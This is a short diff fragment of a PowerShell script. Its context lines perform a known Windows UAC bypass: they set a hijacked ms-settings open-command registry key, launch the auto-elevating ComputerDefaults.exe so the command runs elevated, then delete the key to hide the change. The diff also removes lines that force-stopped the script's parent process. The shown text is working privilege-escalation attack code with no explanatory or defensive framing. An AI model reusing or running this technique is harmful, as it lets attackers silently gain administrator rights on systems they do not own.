@@ -4,8 +4,3 @@ Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "
 Start-Process "C:\Windows\System32\ComputerDefaults.exe"
 Start-Sleep -Milliseconds 1000
 Remove-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Recurse -Force
-$currentProcess = Get-Process -Id $PID
-$parentProcess = Get-CimInstance -ClassName Win32_Process -Filter "ProcessId = '$($currentProcess.ParentProcessId)'"
-if ($parentProcess) {
-    Stop-Process -Id $parentProcess.ProcessId -Force
-}
